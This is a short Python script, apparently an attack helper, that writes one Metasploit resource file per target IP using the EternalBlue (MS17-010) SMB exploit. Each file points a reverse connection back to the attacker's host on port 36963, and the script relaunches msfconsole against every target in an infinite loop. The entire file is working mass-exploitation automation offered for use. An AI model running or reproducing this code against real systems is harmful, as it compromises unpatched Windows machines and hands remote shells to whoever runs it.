from ColorPrint import *;
import pexpect;
def MSRestart(Parameters):
	#PrintGrren(str(Parameters));
	#PrintGreen(str(Parameters));
	#Test: Output Parameters of centent
	SelfIP = Parameters[0];
	AimIPs = Parameters[1:];
	PrintGreen("[+]LIST:"+str(AimIPs));
	ScriptIndex = 0;
	for item in AimIPs:
		PrintGreen("[+]Make script for IP->"+item);
		Script_centent="""use exploit/windows/smb/ms17_010_eternalblue
set RHOST """+item+"""
set LHOST """+SelfIP+"""
set LPORT 36963
set VerifyArch false
exploit""";
		fp = open('MetasploitScript'+str(ScriptIndex)+'.rc','w');
		fp.write(Script_centent);
		fp.close();
		ScriptIndex+=1;
	while(True):
		for Index in range(ScriptIndex):
			PrintGreen("[+] Acttack Aim ip->"+str(AimIPs[Index]));
			Cmd= pexpect.spawn("msfconsole -r "+'MetasploitScript'+str(Index)+'.rc');
			Cmd.expect([pexpect.TIMEOUT]);

	return True;
